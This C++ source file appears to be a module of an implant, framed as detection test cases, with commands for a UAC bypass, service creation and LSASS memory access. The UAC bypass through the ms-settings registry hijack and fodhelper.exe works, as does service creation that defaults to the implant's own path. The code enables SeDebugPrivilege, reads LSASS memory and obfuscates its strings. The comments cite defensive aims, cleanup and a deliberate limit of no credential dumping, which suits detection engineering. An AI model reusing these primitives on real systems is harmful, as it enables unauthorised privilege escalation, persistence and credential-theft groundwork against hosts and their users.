// privesc.cpp — privilege escalation + credential access as detection test cases.
//
// Three primitives, each chosen because Windows telemetry can actually see it:
//
//   !uac      UAC bypass through the ms-settings auto-elevate handler
//             (HKCU\Software\Classes\ms-settings\Shell\Open\command + DelegateExecute,
//             then fodhelper.exe). T1548.002. Telemetry: Sysmon EID 13 on the
//             hijacked key and EID 1 for the auto-elevated process. Whether the
//             trick still elevates on a current Win11 build is irrelevant to the
//             experiment: the registry write and the child process are produced
//             either way, and those are what the rule scores.
//
//   !service  Service creation/modification through the SCM API. T1543.003.
//             Note the attribution caveat, which the rule states as well: an
//             API-created service is written by services.exe, so EID 13 carries
//             *that* image — the strong signal is not the writer but the value
//             (a service binPath under a user-writable directory). Running
//             sc.exe instead would give an EID 1 command line; this module keeps
//             the API path and the rule keys on the value.
//
//   !lsass    Bounded read of lsass.exe with the access masks the collector
//             already logs (0x1010 / 0x1410). T1003.001. The detection signal is
//             the process-access event (EID 10) and, for an EDR, the read itself;
//             this module reports statistics and implements no dump and no
//             credential parsing. That is a boundary, not an unfinished feature:
//             the harvesting half is what turns a detection test case into a
//             credential-theft tool.
#include "privesc.hpp"

#include <windows.h>          // before config.hpp: DWORD-typed constants live there

#include "config.hpp"
#include "utils.hpp"
#include "obfuscate.hpp"

#include <tlhelp32.h>
#include <string>
#include <vector>

namespace {

std::wstring Trim(const std::wstring& s) {
    size_t a = s.find_first_not_of(L" \t\r\n");
    if (a == std::wstring::npos) return {};
    size_t b = s.find_last_not_of(L" \t\r\n");
    return s.substr(a, b - a + 1);
}

std::wstring SelfPath() {
    wchar_t buf[MAX_PATH] = {};
    GetModuleFileNameW(nullptr, buf, MAX_PATH);
    return buf;
}

// Best-effort SeDebugPrivilege for the caller's token. Reported, not fatal:
// without it LSASS access fails with access-denied, which is itself a result.
bool EnableDebugPrivilege() {
    HANDLE tok = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tok))
        return false;
    TOKEN_PRIVILEGES tp = {};
    tp.PrivilegeCount = 1;
    bool ok = false;
    auto name = XSW(L"SeDebugPrivilege");
    if (LookupPrivilegeValueW(nullptr, name.str(), &tp.Privileges[0].Luid)) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        ok = AdjustTokenPrivileges(tok, FALSE, &tp, sizeof(tp), nullptr, nullptr) &&
             GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(tok);
    return ok;
}

DWORD FindPid(const wchar_t* exeName) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = {}; pe.dwSize = sizeof(pe);
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, exeName) == 0) { pid = pe.th32ProcessID; break; }
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return pid;
}

}  // namespace

// ── UAC bypass (T1548.002) ──────────────────────────────────────────────────
std::wstring HandleUac(const std::string& args) {
    std::wstring cmd = Trim(UTF8ToWString(args));
    if (cmd.empty())
        return L"Usage: !uac <command line to run through the auto-elevate handler>";

    auto keyPath = XSW(L"Software\\Classes\\ms-settings\\Shell\\Open\\command");
    HKEY hKey = nullptr;
    DWORD disp = 0;
    LONG rc = RegCreateKeyExW(HKEY_CURRENT_USER, keyPath.str(), 0, nullptr,
                              REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr,
                              &hKey, &disp);
    if (rc != ERROR_SUCCESS)
        return L"[error: could not create the ms-settings handler key, code "
               + std::to_wstring(rc) + L"]";

    const BYTE* cmdBytes = reinterpret_cast<const BYTE*>(cmd.c_str());
    DWORD cmdSize = static_cast<DWORD>((cmd.size() + 1) * sizeof(wchar_t));
    rc = RegSetValueExW(hKey, nullptr, 0, REG_SZ, cmdBytes, cmdSize);
    if (rc == ERROR_SUCCESS) {
        auto dlg = XSW(L"DelegateExecute");   // present-but-empty is the trigger
        rc = RegSetValueExW(hKey, dlg.str(), 0, REG_SZ,
                            reinterpret_cast<const BYTE*>(L""),
                            static_cast<DWORD>(sizeof(wchar_t)));
    }
    RegCloseKey(hKey);
    if (rc != ERROR_SUCCESS)
        return L"[error: handler value write failed, code " + std::to_wstring(rc) + L"]";

    // fodhelper.exe carries auto-elevate in its manifest: it starts elevated
    // without a prompt and hands off to the handler above.
    wchar_t sysRoot[MAX_PATH] = {};
    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
    std::wstring helper = std::wstring(sysRoot) + L"\\System32\\fodhelper.exe";
    std::wstring cmdLine = L"\"" + helper + L"\"";
    STARTUPINFOW si = {}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {};
    BOOL launched = CreateProcessW(nullptr, &cmdLine[0], nullptr, nullptr, FALSE,
                                   CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    DWORD err = launched ? 0 : GetLastError();
    if (launched) {
        WaitForSingleObject(pi.hProcess, 5000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    Sleep(500);
    // Clean up the hijack immediately. Leaving it planted would keep the
    // handler active for every future ms-settings launch on this host — an
    // artifact far beyond the experiment.
    auto shellKey = XSW(L"Software\\Classes\\ms-settings");
    RegDeleteTreeW(HKEY_CURRENT_USER, shellKey.str());

    std::wstring out = L"[privesc] uac bypass (T1548.002)\r\n"
                       L"  handler : HKCU\\" + std::wstring(keyPath.str()) + L"\r\n"
                       L"  command : " + cmd + L"\r\n"
                       L"  fodhelper: ";
    out += launched ? L"launched" : (L"CreateProcess failed, code " + std::to_wstring(err));
    out += L"\r\n  cleanup : handler keys removed\r\n"
           L"  telemetry: Sysmon EID 13 on the ms-settings key + EID 1 for the "
           L"auto-elevated child (defense_evasion_uac_bypass_auto_elevate.yml)\r\n"
           L"  note    : elevation fails on builds where the handler chain is "
           L"patched; the registry write and the child process are produced either way";
    if (IsElevated()) out += L"\r\n  note    : this process is already elevated, so the "
                              L"experiment measures telemetry, not privilege gain";
    return out;
}

// ── Service create / modify (T1543.003) ─────────────────────────────────────
std::wstring HandleService(const std::string& args) {
    std::wstring a = Trim(UTF8ToWString(args));
    size_t sp = a.find(L' ');
    std::wstring verb = (sp == std::wstring::npos) ? a : a.substr(0, sp);
    std::wstring rest = (sp == std::wstring::npos) ? L"" : Trim(a.substr(sp + 1));
    size_t sp2 = rest.find(L' ');
    std::wstring name = (sp2 == std::wstring::npos) ? rest : rest.substr(0, sp2);
    std::wstring binPath = (sp2 == std::wstring::npos) ? L"" : Trim(rest.substr(sp2 + 1));

    if (name.empty() || verb.empty())
        return L"Usage: !service <create|delete|start|stop> <name> [binPath]\r\n"
               L"  create defaults binPath to this implant's own path; delete/start/stop "
               L"only touch the service name given.";
    if (!IsElevated())
        return L"[error: service control needs an elevated token]";

    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!scm)
        return L"[error: OpenSCManager failed, code " + std::to_wstring(GetLastError()) + L"]";

    std::wstring out;
    if (verb == L"create") {
        if (binPath.empty()) binPath = SelfPath();
        SC_HANDLE svc = CreateServiceW(
            scm, name.c_str(), name.c_str(), SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
            binPath.c_str(), nullptr, nullptr, nullptr, nullptr, nullptr);
        if (!svc) {
            DWORD err = GetLastError();
            CloseServiceHandle(scm);
            return L"[error: CreateService failed, code " + std::to_wstring(err) +
                   (err == ERROR_SERVICE_EXISTS ? L" (already exists)" : L"") + L"]";
        }
        CloseServiceHandle(svc);
        out = L"[privesc] service created (T1543.003)\r\n  name: " + name +
              L"\r\n  binPath: " + binPath;
    } else if (verb == L"delete") {
        SC_HANDLE svc = OpenServiceW(scm, name.c_str(), DELETE);
        if (!svc) {
            DWORD err = GetLastError();
            CloseServiceHandle(scm);
            return L"[error: OpenService failed, code " + std::to_wstring(err) + L"]";
        }
        BOOL ok = DeleteService(svc);
        DWORD err = ok ? 0 : GetLastError();
        CloseServiceHandle(svc);
        out = ok ? (L"[privesc] service deleted: " + name)
                 : (L"[error: DeleteService failed, code " + std::to_wstring(err) + L"]");
    } else if (verb == L"start" || verb == L"stop") {
        SC_HANDLE svc = OpenServiceW(scm, name.c_str(), SERVICE_START | SERVICE_STOP);
        if (!svc) {
            DWORD err = GetLastError();
            CloseServiceHandle(scm);
            return L"[error: OpenService failed, code " + std::to_wstring(err) + L"]";
        }
        if (verb == L"start") {
            BOOL ok = StartServiceW(svc, 0, nullptr);
            DWORD err = ok ? 0 : GetLastError();
            out = ok ? (L"[privesc] service started: " + name)
                     : (L"[error: StartService failed, code " + std::to_wstring(err) + L"]");
        } else {
            SERVICE_STATUS st = {};
            BOOL ok = ControlService(svc, SERVICE_CONTROL_STOP, &st);
            DWORD err = ok ? 0 : GetLastError();
            out = ok ? (L"[privesc] service stop requested: " + name)
                     : (L"[error: ControlService failed, code " + std::to_wstring(err) + L"]");
        }
        CloseServiceHandle(svc);
    } else {
        CloseServiceHandle(scm);
        return L"Usage: !service <create|delete|start|stop> <name> [binPath]";
    }
    CloseServiceHandle(scm);

    out += L"\r\n  telemetry: EID 13 under HKLM\\SYSTEM\\CurrentControlSet\\Services\\" + name +
           L" (attributed to services.exe for API creation — the rule keys on the "
           L"binPath value, not the writer)";
    return out;
}

// ── LSASS access + bounded read (T1003.001) ─────────────────────────────────
std::wstring HandleLsass(const std::string& /*args*/) {
    DWORD pid = FindPid(L"lsass.exe");
    if (!pid) return L"[error: lsass.exe not found]";

    bool priv = EnableDebugPrivilege();
    const DWORD kAccess = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;  // 0x1010
    HANDLE h = OpenProcess(kAccess, FALSE, pid);
    if (!h) {
        DWORD err = GetLastError();
        return L"[privesc] lsass access (T1003.001)\r\n  pid: " + std::to_wstring(pid) +
               L"\r\n  access: 0x1010 attempt\r\n  result: denied (code " +
               std::to_wstring(err) + L")" +
               (priv ? L"" : L"\r\n  note: SeDebugPrivilege could not be enabled") +
               L"\r\n  telemetry: EID 10 TargetImage=lsass.exe is still emitted for the "
               L"attempt" +
               (err == ERROR_ACCESS_DENIED
                    ? L"\r\n  note: access denied is the expected result under PPL — the "
                      L"attempt is the test case"
                    : L"");
    }

    // Bounded read: walk committed, readable, non-guarded regions and read at
    // most kMaxBytes in kChunk-size pieces, keeping only statistics. Nothing is
    // written to disk and nothing is parsed — see the module header.
    const SIZE_T kChunk = 64 * 1024;
    const SIZE_T kMaxBytes = 4 * 1024 * 1024;
    BYTE* buf = static_cast<BYTE*>(VirtualAlloc(nullptr, kChunk, MEM_COMMIT, PAGE_READWRITE));
    SIZE_T total = 0;
    DWORD regions = 0, failed = 0;
    if (buf) {
        MEMORY_BASIC_INFORMATION mbi = {};
        BYTE* addr = nullptr;
        while (total < kMaxBytes &&
               VirtualQueryEx(h, addr, &mbi, sizeof(mbi)) == sizeof(mbi)) {
            const bool readable = (mbi.State == MEM_COMMIT) &&
                                  (mbi.Protect & (PAGE_READONLY | PAGE_READWRITE |
                                                  PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
                                                  PAGE_WRITECOPY | PAGE_EXECUTE_WRITECOPY)) &&
                                  !(mbi.Protect & (PAGE_GUARD | PAGE_NOACCESS));
            if (readable) {
                ++regions;
                SIZE_T want = mbi.RegionSize < kChunk ? mbi.RegionSize : kChunk;
                SIZE_T got = 0;
                if (ReadProcessMemory(h, addr, buf, want, &got) && got > 0)
                    total += got;
                else
                    ++failed;   // common under PPL/CFG; counted, not fatal
            }
            BYTE* next = static_cast<BYTE*>(mbi.BaseAddress) + mbi.RegionSize;
            if (next <= addr) break;    // paranoia: no forward progress
            addr = next;
            if (total > 0 && regions > 4096) break;   // hard stop, lab hygiene
        }
        VirtualFree(buf, 0, MEM_RELEASE);
    }
    CloseHandle(h);

    std::wstring out = L"[privesc] lsass access + bounded read (T1003.001)\r\n"
                       L"  pid: " + std::to_wstring(pid) +
                       L"\r\n  access: 0x1010 (PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ)\r\n"
                       L"  regions scanned: " + std::to_wstring(regions) +
                       L"\r\n  bytes read: " + std::to_wstring(total) +
                       L"\r\n  reads failed: " + std::to_wstring(failed) +
                       L" (guard/PPL pages)\r\n"
                       L"  telemetry: EID 10 TargetImage=lsass.exe + GrantedAccess 0x1010 "
                       L"(credential_access_lsass_process_access.yml)\r\n"
                       L"  boundary : statistics only — no dump written, no credential "
                       L"parsing; the harvesting step is deliberately not implemented";
    if (!priv) out += L"\r\n  note: SeDebugPrivilege could not be enabled (partial read only)";
    return out;
}
